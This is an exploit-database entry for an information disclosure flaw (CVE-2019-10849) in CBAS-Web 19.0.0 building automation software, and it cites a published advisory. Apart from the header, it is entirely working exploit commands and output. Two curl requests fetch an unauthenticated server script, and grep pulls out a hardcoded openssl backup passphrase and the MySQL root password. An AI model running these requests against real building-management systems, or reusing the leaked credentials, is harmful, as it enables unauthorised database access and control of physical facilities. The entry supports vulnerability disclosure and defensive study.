# Exploit Title: CBAS-Web 19.0.0 - Information Disclosure
# Google Dork: NA
# Date: 2019-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
# Software Link: https://www.computrols.com/building-automation-software/
# Version: 19.0.0
# Tested on: NA
# CVE : CVE-2019-10849
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system

$ curl -s http://192.168.1.250/cbas/scripts/upgrade/restore_sql_db.sh | grep openssl
openssl enc -d -bf -pass pass:"WebAppEncoding7703" -in $FILE -out $filename.sql.gz

$ curl -s http://192.168.1.250/cbas/scripts/upgrade/restore_sql_db.sh | grep "\-\-password"
#for i in `mysql -B -u root --password="souper secrit" -e "show tables" wadb`; do
#    mysql -u root --password="souper secrit" -e "describe $i" wadb;
mysql -u root --password="souper secrit" $DB < $filename.sql
$MYSQL -u root --password="souper secrit" -e "$SQL"